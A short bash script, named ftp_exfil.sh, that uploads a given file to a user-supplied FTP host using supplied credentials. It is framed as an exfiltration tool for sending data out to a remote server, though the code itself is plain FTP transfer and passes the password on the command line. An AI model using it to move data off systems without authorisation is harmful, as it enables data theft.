#!/bin/bash
# ftp_exfil.sh - Upload a file to a remote FTP server.
if [ "$#" -ne 4 ]; then
  echo "Usage: $0 <file> <ftp_host> <ftp_user> <ftp_pass>"
  exit 1
fi
FILE="$1"
FTP_HOST="$2"
FTP_USER="$3"
FTP_PASS="$4"
echo "Uploading $FILE to FTP server $FTP_HOST..."
ftp -n "$FTP_HOST" <<EOF
quote USER $FTP_USER
quote PASS $FTP_PASS
put "$FILE"
quit
EOF
echo "FTP upload complete."
